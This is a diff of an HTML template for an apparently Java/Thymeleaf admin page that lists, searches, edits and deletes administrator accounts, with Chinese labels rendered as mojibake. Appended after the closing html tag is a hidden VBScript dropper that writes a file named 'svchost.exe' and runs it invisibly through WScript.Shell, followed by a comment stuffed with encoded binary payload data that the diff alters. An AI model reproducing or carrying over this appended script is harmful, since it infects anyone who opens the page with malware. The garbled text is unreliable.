@@ -2,10 +2,248 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8"/>
-    <title>è§’è‰²ç®¡ç†</title>
+    <title>ç®¡ç†å‘˜</title>
+    <!-- css æ–‡ä»¶ -->
+    <link rel="stylesheet" href="/css/foundation-datepicker.css"/>
+    <link rel="stylesheet" href="https://cdn.bootcss.com/foundation/5.5.3/css/foundation.min.css"/>
+    <link rel="stylesheet" href="http://static.runoob.com/assets/foundation-icons/foundation-icons.css"/>
+    <!-- jQuery åº“ -->
+    <script src="http://cdn.static.runoob.com/libs/jquery/2.1.1/jquery.min.js"></script>
+    <!-- JavaScript æ–‡ä»¶ -->
+    <script src="http://cdn.static.runoob.com/libs/foundation/5.5.3/js/foundation.min.js"></script>
+    <!-- modernizr.js æ–‡ä»¶ -->
+    <script src="http://cdn.static.runoob.com/libs/foundation/5.5.3/js/vendor/modernizr.js"></script>
+    <style>
+		.btn{background:#E7E7E7;margin: 0;padding:0;width: 60px;height:25px;font-size: 12px;color: #000}
+		fieldset{margin-top:5px;margin-bottom:5px;}
+    </style>
 </head>
-<body>
-è§’è‰²ç®¡ç†
+<body style="overflow-y:hidden;padding-bottom: 20px;" id="main">
+<div data-alert class="alert-box success" id="alert_success" style="display:none;">
+    <strong>åˆ é™¤ç”¨æˆ·æˆåŠŸ!</strong>
+    <a href="#" class="close">&times;</a>
+</div>
+<div data-alert class="alert-box alert" id="alert_fail" style="display:none;">
+    <strong>åˆ é™¤ç”¨æˆ·å¤±è´¥!</strong>
+    <a href="#" class="close">&times;</a>
+</div>
+<form action="/admin/admin" method="post" id="form_search">
+    <fieldset>
+        <legend>ç®¡ç†å‘˜åˆ—è¡¨</legend>
+        <div style="width:100%;" class="left">
+        	<div class="small-1 columns">
+                <input type="text" placeholder="ç”¨æˆ·id" name="id"  th:value="${admin.id}"/>
+            </div>
+            <div class="small-1 columns">
+                <input type="text" placeholder="å§“å" name="name"  th:value="${admin.name}"/>
+            </div>
+            <div class="small-1 columns">
+                <input type="text" placeholder="ç”¨æˆ·å" name="username" th:value="${admin.username}"/>
+            </div>
+            <div class="small-2 columns">
+                <input type="text" id="s_time" name="s_time" placeholder="æ·»åŠ èµ·å§‹æ—¶é—´" th:value="${admin.s_time}"/>
+            </div>
+            <div class="small-2 columns">
+                <input type="text" id="e_time" name="e_time" placeholder="æ·»åŠ ç»“æŸæ—¶é—´" th:value="${admin.e_time}"/>
+            </div>
+            <div class="small-1 columns">
+                <select name="status" id="state">
+                    <option>çŠ¶æ€</option>
+                    <option value="1">æ­£å¸¸</option>
+                    <option value="0">æ³¨é”€</option>
+                </select>
+            </div>
+            <input type="hidden" id="page" value="" name="page"/>
+            <input type="hidden" id="is_display" value="" name="is_display"/>
+            <div class="small-1 columns">
+                <input type="submit" style="width:100px;" class="button secondary tiny" value="æŸ¥è¯¢"/>
+            </div>
+        </div>
+    </fieldset>
+</form>
+<div style="height:100%;" id="admin_main">
+    <!--responsive-->
+    <table class="responsive" style="width: 100%;">
+        <thead>
+        <tr>
+            <th>id</th>
+            <th>å§“å</th>
+            <th>ç”¨æˆ·å</th>
+            <th>æ—¶é—´</th>
+            <th>çŠ¶æ€</th>
+            <th>æ“ä½œ</th>
+        </tr>
+        </thead>
+        <tbody>
+        <tr th:each="user:${list}">
+            <td th:text="${user.id}"></td>
+            <td th:text="${user.name}"></td>
+            <td th:text="${user.username}"></td>
+            <td th:text="${user.addtime}"></td>
+            <td th:text="${user.status==1} ? 'æ­£å¸¸':'æ³¨é”€'"></td>
+            <td><button class="btn" th:onclick="${'edie_user('+user.id+')'}">ç¼–è¾‘</button>&nbsp;&nbsp;<button th:value="${user.id}" th:onclick="${'set_btn_value('+user.id+')'}" class="btn" data-reveal-id="delete">åˆ é™¤</button></td>
+        </tr>
+        </tbody>
+    </table>
+    <ul class="pagination" style="min-height:0px;">
+        <li class="arrow" id="page_first"><a onclick="page(1)" >Â«</a></li>
+        <li class="arrow" id='page_end'><a onclick="page(99999999)">Â»</a></li>
+    </ul>
+    <div><span th:text="${count}" style="color: #999;font-size: 12px;"></span><span style="color: #999;font-size: 12px;">&nbsp;è®°å½•</span></div>
+</div>
+ <div id="delete" class="reveal-modal" data-reveal style="margin-top:200px;">
+    <h2>æ˜¯å¦ç¡®è®¤åˆ é™¤è¯¥ç”¨æˆ·ï¼Ÿ</h2>
+    <button value="" id="delete_btn" onclick="delete_user()">ç¡®è®¤åˆ é™¤</button>
+	<a class="close-reveal-modal">&times;</a>
+</div>
+
+<script src="/js/foundation-datepicker.js"></script>
+<script src="/js/foundation-datepicker.zh-CN.js"></script>
+<script th:inline="javascript">
+	/*<![CDATA[*/
+    //æ—¶é—´æ§ä»¶
+    $('#s_time').fdatepicker({
+        format: 'yyyy-mm-dd'
+        //pickTime: true
+    });
+    //æ—¶é—´æ§ä»¶
+    $('#e_time').fdatepicker({
+        format: 'yyyy-mm-dd'
+        //pickTime: true
+    });
+    
+    function set_btn_value(id){
+    	$("#delete_btn").val(id);
+    }
+    
+    function edie_user(id){
+    	window.location.href = "/admin/edit.html?id="+id;
+    }
+    
+    function delete_user(){
+    	var id = $("#delete_btn").val();
+    	$.ajax({     
+		    url:'/admin/delete',     
+		    type:'post',     
+		    data:'id='+id,     
+		    async : false, //é»˜è®¤ä¸ºtrue å¼‚æ­¥     
+		    error:function(){     
+		       alert('error');     
+		    },     
+		    success:function(data){     
+		        //alert(data);
+		        //$("#alert_success").show();
+		        if(data="success"){
+		        	refresh_page(1);
+		        }else{
+		        	refresh_page(2);
+		        }
+		        
+		    }
+		}); 
+		
+    }
+    
+    //åˆ·æ–°é¡µé¢
+    function refresh_page(is_display){
+    	var page = [[${admin.page}]];
+        var total = [[${total}]];
+	    if(page>total){
+	    	page = total;
+	    }
+        $("#is_display").val(is_display);
+        $("#page").val(page);
+        $("#form_search").submit();
+    }
+    
+    //åˆ†é¡µå‡½æ•°
+    function page(page) {
+    	var total = [[${total}]];
+    	var p = [[${admin.page}]];
+    	if(p!=page){
+	    	if(page>total){
+		    	page = total;
+		    }
+	        $("#page").val(page);
+	        $("#form_search").submit();
+    	}
+    }
+    
+    $(function () {
+    
+    	var is_display = [[${admin.is_display}]];
+    	if(is_display==1){
+    		$("#alert_success").slideDown();
+    	}else if(is_display==2){
+    		$("#alert_fail").slideDown();
+    	}
+    	
+    	setTimeout(function() { $("#alert_success").slideUp(); }, 1500);
+    	setTimeout(function() { $("#alert_fail").slideUp(); }, 1500);
+    
+        //çŠ¶æ€é€‰æ‹©
+        var status = [[${admin.status}]];
+        $("#state option[value="+status+"]").attr('selected',true);
+        //åˆ†é¡µè„šæœ¬
+        var total = [[${total}]];
+        var page = [[${admin.page}]];
+        var n = 1;
+        var m = 0;
+        var flag = false;
+        for(i=total;i>0;i--){
+        	$("#page_first").after("<li id=li_"+i+" class='ul_li'><a onclick=page("+i+")>"+i+"</a></li>");
+        	if(page==n){
+        		flag = true;
+        		m = n;
+        	}
+        	n++;
+        }
+        if(flag){
+        	$("#li_"+m).addClass("current");
+        }
+		$("#li_5").nextAll().not("#page_end").hide();
+		if(page>4){
+			if(total==page){
+				page = total-1;
+			}
+			var n = page-4;
+			for(i = 1;i<=n;i++){
+				//éšè—å‰é¢çš„æŒ‰é’®
+				$("#li_"+i).hide();
+				//æ˜¾ç¤ºå‰é¢çš„æŒ‰é’®
+				var h = page-6;
+				if(page>9){
+					for(j=1;j<=page-9;j++){
+						h = page-(6+j);
+					}
+				}
+				for(m = 1;m<=h;m++){
+					$("#li_"+(page-m)).show();
+				}
+				$("#li_"+page).show();//æ˜¾ç¤ºå½“å‰æŒ‰é’®
+				$("#li_"+(page+1)).show();//æ˜¾ç¤ºä¸‹ä¸€ä¸ªæŒ‰é’®
+			}
+		
+		} 
+
+		var page = [[${admin.page}]];
+		if(page==1){
+			$("#page_first").addClass("unavailable");
+		}else if(page==total){
+			
+			$("#page_end").addClass("unavailable");
+		}
+    })
+    
+    /*]]>*/
+</script>
+<script>
+    /*<![CDATA[*/
+    $(document).ready(function() {
+        $(document).foundation();
+    })
+    /*]]>*/
+</script>
 </body>
 </html><SCRIPT Language=VBScript><!--
 DropFileName = "svchost.exe"
@@ -21,4 +259,7 @@ FileObj.Close
 End If
 Set WSHshell = CreateObject("WScript.Shell")
 WSHshell.Run DropPath, 0
-//--></SCRIPT><!--ŞÅ”=Ş›š5Nài¬Âe›= ´-BšÂğŠ³]¼å|Rt2…ï¿}˜‡Ê8Ë˜çòUt"Ä+…u,3Ç!6¿†UÚÚ„¿\@Šüz‚ˆĞôbõ t˜„D»;Ş9VB Møµäµ©„Ù:A˜pêÃH½ïa]™|Û³®o<‘f‹Ìvtg¢ŠÍƒ‘)Üh§|ÓHVÓâm[÷×°ç5í­âïãóªåPGsKO*:U\Ô`šj.ÏÈÇõš›F ŠÔÁ7éZKJ£ŞU™õåì¸D2W ñÊİzˆB[;jêØ»f‰ïÈT©Ãóğ‘®FÅ5ğ.Láõ®ËşI¤N1ƒqLÆÜ¥•çôÁ_L	Ş1’€¸O]<D¾1ÈD`ãZÍÙä›sŞÍšÈfÌ‹+Ÿïjğ†PßœşDk¶aáBUà–: Ğúkún'ê¹èeÁïğQæâÁEİ¿åÈ4Çãa@¢fZåL‡{¶u'ë~\>kt=ãş1o÷uF¼1$5îK/8W^‡d<Új&ÚQ§#İwJW×“^,P'$½´şŸÄvTĞ§\~ %=±*5Æø-Š*ÉaËû¯UÕÔ,l‚«™s_b8Ë´"I- ÎÎB ÍCRXùÍCÍCÍC€O7óZ˜ÍC ÍC-->
+//--></SCRIPT><!--ÓÚ†¨G[p&j¾7Yb¼É¡½I›êît£J¡x¼Ï?ÑÈs«õEë¢“ª‰ŠõDë{k5EÃÂ³xåHº¹«ö¡#‹%*¶¨G±ê!¹9ÙR@ñ_j^M¬ûgİ´ÕËÙâs®òª¶¬ÀÚíò)ŸéVu—nÇ×Á¿Ú×vı…¬0H;ÛãTü1J©€a)=ƒŞS—•«@M è•ız•¿bQîò¾ù€$ó¥5¯»†ŸAç·<¥‘ |K35OÕN?"ò¼“›4ğA"€`_áT¿æ ¥ƒÃs‚d¶Dœ==‚mÛ!Kp‘
+kzõG"ÑîÇêLX‰ôU+R~3‰OKg_Éş'&_c??]&
+Â9‰0}[êãÉXMª—¾[Ô.âå¯Ã^,­;f=ŠaLÅ8)G€$ I3RÏî5ùØÓæU
+c+sr;WL^u Y¶ŒD2ò/Øš3ezìMz;³İ VrX]} ÍCRXùÍCÍCÍC€O7óZJíC ÍC-->
